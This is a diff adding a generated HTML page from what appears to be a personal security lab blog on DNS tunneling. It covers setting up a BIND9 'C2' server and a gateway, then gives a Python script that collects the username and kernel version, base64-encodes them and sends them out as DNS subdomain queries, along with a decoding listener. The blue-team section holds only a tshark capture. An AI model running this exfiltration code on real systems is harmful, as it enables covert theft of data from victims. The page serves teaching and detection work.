@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="en-gb" dir="ltr">
+<head><script src="/jenkaj-lab/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=jenkaj-lab/livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width">
+<title>DNS Tunneling | My MITRE ATT&amp;CK Journey</title>
+
+
+
+      <script src="http://localhost:1313/jenkaj-lab/js/main.js"></script>
+
+
+  <link rel="stylesheet" href="http://localhost:1313/jenkaj-lab/css/main.css">
+</head>
+<body>
+  <header>
+    
+  <nav>
+    <div class="title">My MITRE ATT&amp;CK Journey</div>
+    <ul class="links">
+    <li>
+      <a href="http://localhost:1313/jenkaj-lab/">Posts</a>
+    </li>
+    <li>
+      <a>Legal</a>
+    </li>
+    </ul>
+  </nav>
+
+
+  </header>
+  <main>
+    
+  <h1>DNS Tunneling</h1>
+
+  
+  
+  <time datetime="2025-06-11T00:00:00&#43;00:00">June 11, 2025</time>
+
+  
+    <div class="disclaimer">
+      <p><strong>For educational purposes only</strong>. The techniques described in these articles are intended for use in controlled environments. Using them in unauthorized settings may violate policy or law. For more information, please read the <a href="https://jenkaj-lab.github.io/jenkaj-lab/disclaimer/">full disclaimer</a>.</p>
+    </div>
+  
+  <table>
+  <thead>
+      <tr>
+          <th>Category</th>
+          <th>ID</th>
+          <th>Description</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Tactic</td>
+          <td>TA0011</td>
+          <td>Command and Control</td>
+      </tr>
+      <tr>
+          <td>Techniques</td>
+          <td>T1071, T1132</td>
+          <td>Application Layer Protocol, Data Encoding</td>
+      </tr>
+      <tr>
+          <td>Sub-Techniques</td>
+          <td>T1071.004, T1132.001</td>
+          <td>DNS, Standard Encoding</td>
+      </tr>
+  </tbody>
+</table>
+<h1 id="introduction">Introduction</h1>
+<p>The Domain Name System (DNS) is a common Application Layer protocol that communicates over port 53. Many organisations will allow traffic over this protocol because it is essential for translating domain names into IP addresses. Adversaries may use this to their advantage and communicate with their Command and Control (C2) servers over this commonly-used protocol, blending in with normal traffic.</p>
+<p>In today&rsquo;s lab I will be demonstrating my own take on this issue, showcasing one way in which an adversary may exfiltrate data using DNS queries. It walks through the configuration of an infected machine, DNS server, firewall, and includes scripts that demonstrate how adversaries might extract, encode and transmit data. The lab concludes with a blue team investigation into detection and remediation strategies.</p>
+<p>Though the main technique explored in this lab is <code>T1081.004</code>, there is a slight crossover with <code>T1132.001</code>. This is because domain queries made over the DNS protocol can fail if any obscure characters exist, therefore all exfiltrated data from the infected machine is encoded with base64 first. This isn&rsquo;t a direct demonstration of the technique itself, but rather a necessary caveat of my chosen extraction method. In this case, the infected machine refers to the system hosting malware, which extracts system information and exfiltrates it to a malicious DNS server.</p>
+<h1 id="configuration">Configuration</h1>
+<p>For this configuration I am using Ubuntu Server 24.04.2 LTS for the C2 server and gateway, and Arch Linux for the infected machine. You don&rsquo;t need to use Arch for your infected machine, you can use whatever Linux distribution you&rsquo;re comfortable with. I recommend Ubuntu Server for the C2 server because it offers easy-to-install DNS software from the package repository, and is very beginner friendly.</p>
+<p>During this configuration I will expect you to have some experience working with Virtual Machines (VMs). This is important because I will not be going into specifics of how to configure the VM. You will be responsible for managing your own virtual hardware and resource allocation.</p>
+<p>My servers and hosts are setup as VMs using VirtualBox. I&rsquo;ve decided on this purely because it works well on Linux, and because it&rsquo;s software that I&rsquo;m familiar with. Use whatever virtualization technology you&rsquo;re comfortable with to setup your three VMs, then continue reading to configure the DNS.</p>
+<h3 id="c2-server">C2 Server</h3>
+<p>First of all, make sure you download <code>bind9</code> and <code>dnsutils</code>. <code>bind9</code> is what we will be using as the name server, and <code>dnsutils</code> gives us some common DNS troubleshooting tools like <code>nslookup</code>. Install these with the following command:</p>
+<pre tabindex="0"><code>sudo apt-get install bind9 dnsutils
+</code></pre><p>I will be covering all the steps required to get this up and running, but I would encourage you to read <a href="https://documentation.ubuntu.com/server/how-to/networking/install-dns/index.html">Ubuntu&rsquo;s Tutorial</a> on setting up a DNS server because it&rsquo;s much more comprehensive than mine. It&rsquo;s also a very good place to start if you&rsquo;re a beginner and have never setup a DNS server before.</p>
+<p>To setup the forward lookup zone you need to modify <code>/etc/bind/named.conf.local</code>. You&rsquo;ll change this to use whatever FQDN you want, I&rsquo;ve gone with the very creative <code>homelab.local</code>, then list it as type <em>master</em> and point it to your new file. This tells the DNS where to look for your forward zone configurations.</p>
+<pre tabindex="0"><code>zone &#34;homelab.local&#34; {
+  type master;
+  file &#34;/etc/bind/db.homelab.local&#34;;
+};
+</code></pre><p>The next logical step should then be to make the forward zone file. To do that just copy an existing zone file as a template for editing, matching the file path you used in <code>named.conf.local</code>.</p>
+<pre tabindex="0"><code>sudo cp /etc/bind/db.local /etc/bind/db.homelab.local
+</code></pre><p>Now you want to open that file in a text editor and make some changes. You can copy my file, just make sure you change it to reflect the correct domain and IP address for your nameserver.</p>
+<blockquote>
+<p>Important: The serial number needs to be incremented any time you make a change to this file.</p></blockquote>
+<pre tabindex="0"><code>;
+; BIND data file for local loopback interface
+;
+$TTL    604800
+@       IN      SOA     homelab.local. root.homelab.local. (
+                              2         ; Serial
+                         604800         ; Refresh
+                          86400         ; Retry
+                        2419200         ; Expire
+                         604800 )       ; Negative Cache TTL
+;
+@       IN      NS      homelab.local.
+@       IN      A       192.168.1.155      
+</code></pre><p>That&rsquo;s all you need to do to make a working DNS, but we need to go one step further and enable logging. Enabling logs will allow us to capture queries from the infected machine and save them for processing. This file doesn&rsquo;t have any system-specific content so feel free to just copy and paste it if you want. Pop these changes into <code>/etc/bind/named.conf</code>:</p>
+<pre tabindex="0"><code>include &#34;/etc/bind/named.conf.options&#34;;
+include &#34;/etc/bind/named.conf.local&#34;;
+include &#34;/etc/bind/named.conf.default-zones&#34;;
+
+logging {
+        channel query.log {
+                file &#34;/var/log/named/query.log&#34;;
+        };
+        category queries { query.log; };
+};
+</code></pre><p>Now, let&rsquo;s finish setting up the logging system and restart services to apply changes. Run these commands to make the new directory for the logs to live in, change the ownership to bind (the user which the <em>named daemon</em> runs as), restart the service to apply any changes, and start listening for logs.</p>
+<pre tabindex="0"><code>sudo mkdir /var/log/named
+sudo chown bind:bind /var/log/named
+sudo systemctl restart bind9
+sudo tail -f /var/log/named/query.log
+</code></pre><p>On a separate machine, use the <code>nslookup</code> tool from the <code>dnsutils</code> suite to query your newly configured domain and verify functionality. Feel free to use the infected machine for this, just make sure it&rsquo;s configured to use your new DNS (see the next section to learn how to do this). There&rsquo;s a snippet of both the command I used and the output below. If you&rsquo;ve followed the steps correctly you will see the domain name and its resolved IP address.</p>
+<pre tabindex="0"><code>[alex@extarch c2-projects]$ nslookup homelab.local
+Server:		192.168.1.155
+Address:	192.168.1.155#53
+
+Name:	homelab.local
+Address: 192.168.1.155
+</code></pre><p>This command serves two purposes:</p>
+<ol>
+<li>Verify that the domain resolves correctly</li>
+<li>Create a log entry on the server</li>
+</ol>
+<p>The server, still running <code>tail -f /var/log/named/query.log</code>, will print a log entry for that query that should look similar to the following snippet:</p>
+<pre tabindex="0"><code>client @0x77042c1ca578 192.168.1.182#36083 (homelab.local): query: homelab.local IN A + (192.168.1.155)
+</code></pre><h3 id="firewall">Firewall</h3>
+<p>Configure two network adapters - one host-only and one NAT. The host-only should be shared with the infected machine and the NAT will allow you to communicate with wider internet and the rest of the network, essentially acting as a gateway to the internet for the infected machine.</p>
+<p>To configure the firewall you need to have two Network Interface Cards (NICs). One will link exclusively with the infected machine, and the other will allow the firewall to freely communicate with the internet and internal network. To do this you&rsquo;ll typically need to setup a Host-Only adapter and a Network Address Translation (NAT) adapter. Or in my case, a bridged adapter because I&rsquo;m using a Wi-Fi adapter. In any case you&rsquo;ll need to make some configurations on both machines to enable communication between the two machines. If you make the first NIC your normal adapter (i.e. one that can reach the internet without any effort) you should only need to configure the Host-Only link.</p>
+<p>To begin, type <code>ip addr</code> into your terminal to see your network devices. You should see two NICs, one of which will be down like in the example below:</p>
+<pre tabindex="0"><code>3: enp0s8: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc fq_codel state DOWN group default qlen 1000
+    link/ether 08:00:27:7d:98:82 brd ff:ff:ff:ff:ff:ff
+</code></pre><p>This is the NIC we&rsquo;ll be using for our Host-Only network. Bring up this interface.</p>
+<pre tabindex="0"><code>sudo ip link set enp0s up
+</code></pre><p>After you&rsquo;ve run that command you should see that it&rsquo;s state has changed. Run <code>ip addr</code> again to verify that.</p>
+<pre tabindex="0"><code>3: enp0s8: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 08:00:27:7d:98:82 brd ff:ff:ff:ff:ff:ff
+    inet6 fe80::a00:27ff:fe7d:9882/64 scope link 
+       valid_lft forever preferred_lft forever
+</code></pre><p>Edit your network config file. In Ubuntu it will be in <code>/etc/netplan/</code> by default. Mine is <code>/etc/netplan/50-cloud-init.yaml</code> for example. When you do this you&rsquo;ll need to make a new entry for your network adapter that you just brought up. Make sure the address you use here aligns with what&rsquo;s configured in your host-only adapter in your VM software settings.</p>
+<pre tabindex="0"><code>network:
+  version: 2
+  ethernets:
+    enp0s3:
+      dhcp4: true
+    enp0s8:
+      addresses:
+        - 192.168.56.10/24
+</code></pre><p>When that&rsquo;s done run</p>
+<pre tabindex="0"><code>sudo netplan apply
+ip addr
+</code></pre><p>And you should see that your adapter now has the IP address you assigned.</p>
+<pre tabindex="0"><code>3: enp0s8: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 08:00:27:7d:98:82 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.56.10/24 brd 192.168.56.255 scope global enp0s8
+       valid_lft forever preferred_lft forever
+    inet6 fe80::a00:27ff:fe7d:9882/64 scope link 
+       valid_lft forever preferred_lft forever
+</code></pre><p>Then you need to configure traffic forwarding:</p>
+<pre tabindex="0"><code>sudo sysctl -w net.ipv4.ip_forward=1
+sudo iptables -t nat -A POSTROUTING -o enp0s3 -j MASQUERADE
+sudo iptables -A FORWARD -i enp0s8 -o enp0s3 -j ACCEPT
+sudo iptables -A FORWARD -i enp0s3 -o enp0s8 -m state --state RELATED, ESTABLISHED -j ACCEPT
+</code></pre><p>You&rsquo;ll also need to modify <code>/etc/resolv.conf</code>. Doing this simulates real-world DNS connection by adding the C2 server to the list of recognised nameservers. In other words; you&rsquo;ll be allowing the infected machine to treat your server as its own DNS, enabling IP resolution whilst keeping it isolated to your private network. In real-world scenarios this wouldn&rsquo;t be required because the domain would be internet facing and resolved by a public DNS provider.</p>
+<pre tabindex="0"><code>nameserver 192.168.1.155 # Change this to the IP of your DNS server
+</code></pre><p>Everything done on the firewall machine up until this point has enabled two-way communication with the infected machine, and established the C2 server as a recognised DNS resolver. The next steps will show some actual firewall cofigurations, which should help to understand the mechanics of DNS tunneling, and setup a sensor to monitor and detect suspicious network activity.</p>
+<ul>
+<li>firewall</li>
+<li>zeek</li>
+<li>wazuh integration</li>
+</ul>
+<h3 id="infected-machine">Infected Machine</h3>
+<p>The infected machine doesn&rsquo;t need much in terms of configuration. Out of the box though this won&rsquo;t work, we&rsquo;ll need to connect it to the Host-Only network and route traffic through the firewall or it won&rsquo;t be able to reach the internet. Figure out what your network card&rsquo;s name is using <code>ip addr</code> then do the following:</p>
+<pre tabindex="0"><code>sudo ip link set enp0s3 up
+sudo ip addr add 192.168.56.11/24 dev enp0s3
+sudo ip route add default via 192.168.56.10
+</code></pre><p>Make sure you change the name of the network interface and the IP addresses in those commands to fit your requirements. By running those three commands you&rsquo;ve effectively activated the NIC, assigned an IP address to it, and told it to route traffic through the firewall.</p>
+<h1 id="red-team">Red Team</h1>
+<p>With configuration finished the red team engagement can commence. For this part we assume that the adversary has already managed to get malware onto the victim&rsquo;s machine, and it is now infected. This malware was created specifically for this lab, is written in Python, and is provided in the next code block.</p>
+<p>I&rsquo;ve named this malware <code>dns_tunneling.py</code> and its sole purpose is to extract information from the infected machine and exfiltrate it over DNS to the C2 server. That might sound complicated, but it&rsquo;s quite easy when you break it down into steps:</p>
+<ol>
+<li>Collect the data using built-in linux commands via <code>subprocess</code></li>
+<li>Encode it with base64 for seamless transportation</li>
+<li>Clean the data and strip unnecessary characters</li>
+<li>Query the C2 DNS server with the encoded data</li>
+</ol>
+<p>Encoding with base64 is required because DNS operates with a strict set of character limitations. This means that certain special characters like spaces, slashes and non-ASCII symbols could break the query entirely. When you encode this data with base64 you&rsquo;re essentially sanitizing the data so that it doesn&rsquo;t interfere with the query&rsquo;s structure.</p>
+<p>Please note the DNS toolkit used in this malware is not installed by default. <code>subprocess</code> and <code>base64</code> will be included with a typical Python install but you will need to install <code>dnspython</code> to get the exfiltration section to work. You can do this by running <code>pip install dnspython</code>. Note that this likely won&rsquo;t work and you&rsquo;ll have to use your chosen distribution&rsquo;s package manager to install this, or setup a virtual environment with Python. I went with the package option and ran <code>sudo pacman -S python-dnspython</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">base64_encode</span>(data):
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># base64 encoding requires input data as bytes</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> isinstance(data, bytes):
+</span></span><span style="display:flex;"><span>       data <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(data)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> data<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run_command</span>(commands):
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># process commands and return stdout as bytes</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> subprocess<span style="color:#f92672">.</span>run(commands, capture_output<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)<span style="color:#f92672">.</span>stdout
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Extract</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess
+</span></span><span style="display:flex;"><span>raw_username <span style="color:#f92672">=</span> run_command(<span style="color:#e6db74">&#34;whoami&#34;</span>)
+</span></span><span style="display:flex;"><span>raw_system_info <span style="color:#f92672">=</span> run_command([<span style="color:#e6db74">&#34;uname&#34;</span>, <span style="color:#e6db74">&#34;-r&#34;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Encode</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span>encoded_username <span style="color:#f92672">=</span> base64_encode(raw_username)
+</span></span><span style="display:flex;"><span>encoded_system_info <span style="color:#f92672">=</span> base64_encode(raw_system_info)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Exfiltrate</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> dns.resolver
+</span></span><span style="display:flex;"><span>domain <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.homelab.local&#34;</span> <span style="color:#75715e"># change this to suit your needs</span>
+</span></span><span style="display:flex;"><span>encoded_message <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>encoded_username<span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">{</span>encoded_system_info<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> domain
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>    dns<span style="color:#f92672">.</span>resolver<span style="color:#f92672">.</span>resolve(encoded_message, <span style="color:#e6db74">&#39;TXT&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># pass to ignore errors when resolving domains</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># -- errors will occur because the domains are non-existent</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">pass</span>
+</span></span></code></pre></div><p>When the script above is run your C2 server should receive a log that looks similar to this:</p>
+<pre tabindex="0"><code>client @0x77042c1ca578 192.168.1.182#55499 (YWxleAo=.Ni4xNC4xMC1hcmNoMS0xCg==.homelab.local): query: YWxleAo=.Ni4xNC4xMC1hcmNoMS0xCg==.homelab.local IN TXT +E(0) (192.168.1.155)
+</code></pre><p>Notice how the query contains two obfuscated strings; <code>YWxleAo=</code> and <code>Ni4xNC4xMC1hcmNoMS0xCg==</code>. What we&rsquo;ve done here is queried <code>homelab.local</code> but included the exfiltrated and encoded data as two additional subdomains. In doing this the C2 server has managed to log the query despite the fact that the domain does not exist. This is exactly how we will harness this exfiltration technique - we just need to make a listener that can decode the logs for us.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> re
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>dns_log_file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/var/log/named/query.log&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(dns_log_file, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> file:
+</span></span><span style="display:flex;"><span>    file<span style="color:#f92672">.</span>seek(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">2</span>) <span style="color:#75715e"># move to end of file</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>        message <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>        line <span style="color:#f92672">=</span> file<span style="color:#f92672">.</span>readline()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> line:
+</span></span><span style="display:flex;"><span>            line <span style="color:#f92672">=</span> line<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">match</span> <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;query: ([^\s]+)&#39;</span>, line)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#66d9ef">match</span>:
+</span></span><span style="display:flex;"><span>                query <span style="color:#f92672">=</span> <span style="color:#66d9ef">match</span><span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>                split_query <span style="color:#f92672">=</span> query<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;.&#39;</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> section <span style="color:#f92672">in</span> split_query:
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> section <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;homelab&#34;</span> <span style="color:#f92672">or</span> section <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;local&#34;</span>:
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                        decoded_section <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(section)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>                        message<span style="color:#f92672">.</span>append(decoded_section)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> message:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34; &#34;</span><span style="color:#f92672">.</span>join(message))
+</span></span><span style="display:flex;"><span>        time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
+</span></span></code></pre></div><p><code>dns_listener.py</code> is designed to listen to the DNS log file for any updates, refreshing every second. You may have noticed that this is a very basic example and isn&rsquo;t very fault-tolerant. It will quickly strip out the query within the DNS record, split that query into sections by periods, and decode those sections if they don&rsquo;t match one of two keywords; homelab and local. Make sure to adapt those keywords to fit your setup if you&rsquo;re following along or you will have errors. A more robust approach would be to verify whether each section is actually base64-encoded rather than excluding specific keywords. However, this works perfectly fine for this lab exercise.</p>
+<p>It&rsquo;s important to note that the malware on your infected machine will gather user and system information which will be different from mine. In other words, my example output will look much different to yours because you will have chosen your own username and operating system. That said, if all steps were followed correctly, the listener will have successfully decoded the DNS query and output the infected machine&rsquo;s details in plaintext:</p>
+<pre tabindex="0"><code>alex@c2-server:~$ python3 dns_listener.py 
+alex 6.14.10-arch1-1
+</code></pre><p>With that you&rsquo;ve had a basic example of how an adversary might exfiltrate data via the DNS protocol. The example I&rsquo;ve given is the first step of communication, where the server has now received information which it can use to identify the infected machine. In future communications the infected machine could prefix messages with this information so that the C2 server may recognise the source of the data.</p>
+<h1 id="blue-team">Blue Team</h1>
+<p><code>tshark</code></p>
+<pre tabindex="0"><code>   25 3.127105183 192.168.1.182 → 8.8.8.8      DNS 118 Standard query 0xe83a TXT YWxleAo=.Ni4xNC4xMC1hcmNoMS0xCg==.homelab.local OPT
+   26 3.137087890      8.8.8.8 → 192.168.1.182 DNS 193 Standard query response 0xe83a No such name TXT YWxleAo=.Ni4xNC4xMC1hcmNoMS0xCg==.homelab.local SOA a.root-servers.net OPT
+</code></pre><h1 id="conclusion">Conclusion</h1>
+
+  
+
+
+  </main>
+  <footer>
+    <p>Copyright 2025. All rights reserved.</p>
+
+  </footer>
+</body>
+</html>
